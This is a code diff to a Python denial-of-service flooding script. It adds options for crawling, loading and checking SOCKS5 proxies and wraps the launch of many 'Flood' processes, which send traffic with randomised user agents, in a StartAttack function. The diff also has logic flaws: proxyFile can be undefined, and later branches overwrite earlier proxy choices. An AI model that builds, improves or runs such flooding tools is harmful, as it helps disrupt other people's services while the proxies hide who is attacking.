@@ -59,13 +59,30 @@ def Flood(indexPicker):
         except:
             pass
  
-proxies = open("socks5.txt").readlines()
+if "--socksCrawler" in sys.argv:
+    socksCrawler()
+else:
+    pass
+ 
+if "--useMyFile" in sys.argv:
+    proxyFile = input("Your file: ")
+    proxies = open(proxyFile).readlines()
+else:
+    proxies = open("socks5.txt").readlines()
+ 
+if "--checkProxies" in sys.argv:
+    proxies = open(proxyFile).readlines()
+    checkProxies()
+else:
+    proxies = open("socks5.txt").readlines()
 
 userAgentList = []
 for _ in range(100):
     userAgent = UserAgent().random
     userAgentList.append(userAgent)
-for indexPicker in range(threadNumber):
-    process = multiprocessing.Process(target=Flood, args=(indexPicker, ))
-    process.setDaemon = True
-    process.start()
+def StartAttack():
+    for indexPicker in range(threadNumber):
+        process = multiprocessing.Process(target=Flood, args=(indexPicker, ))
+        process.setDaemon = True
+        process.start()
+StartAttack()
